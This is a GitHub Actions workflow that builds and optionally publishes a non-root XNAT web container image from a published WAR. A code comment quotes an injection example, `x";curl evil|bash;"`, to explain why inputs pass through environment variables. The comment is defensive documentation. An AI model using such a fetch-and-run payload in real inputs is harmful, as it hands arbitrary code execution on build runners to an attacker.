name: Build non-root XNAT image

# Manually-dispatched build of the non-root xnat-web container image. Wraps a
# PUBLISHED war (pulled from JFrog by docker/build.sh, so container bytes ==
# the metal/file install) and publishes to GHCR. Version-agnostic: pass the
# war_url + image_tag + the matching Tomcat base, so this one workflow on master
# builds any line (1.9.x on JDK8, 1.10 on JDK21).

on:
  workflow_dispatch:
    inputs:
      war_url:
        description: "Published WAR URL to wrap (JFrog libs-release)"
        required: true
      war_sha256:
        description: "Optional sha256 of the WAR, verified before unzip"
        required: false
        default: ""
      image_tag:
        description: "Image version tag, e.g. 1.9.3.5"
        required: true
      tomcat_image:
        description: "Tomcat base (JDK8 for 1.9.x, jdk21 for 1.10)"
        required: false
        default: tomcat:9.0-jdk8-temurin-noble
      push:
        description: "Push to GHCR (false = build-only dry run)"
        type: boolean
        default: false

permissions:
  contents: read
  packages: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Log in to GHCR
        if: ${{ inputs.push }}
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build (and optionally push) the non-root image
        # Inputs are passed via env (not spliced into the script body), so a value
        # like `x";curl evil|bash;"` is an inert string, not runner-side code.
        env:
          IMAGE_TAG: ${{ inputs.image_tag }}
          WAR_URL: ${{ inputs.war_url }}
          WAR_SHA256: ${{ inputs.war_sha256 }}
          TOMCAT_IMAGE: ${{ inputs.tomcat_image }}
          PUSH: ${{ inputs.push }}
          REPO_OWNER: ${{ github.repository_owner }}
        run: |
          args=(--image "ghcr.io/${REPO_OWNER}/xnat-web:${IMAGE_TAG}" --war-url "$WAR_URL" --tomcat-image "$TOMCAT_IMAGE")
          [ -n "$WAR_SHA256" ] && args+=(--war-sha256 "$WAR_SHA256")
          [ "$PUSH" = "true" ] && args+=(--push)
          bash docker/build.sh "${args[@]}"
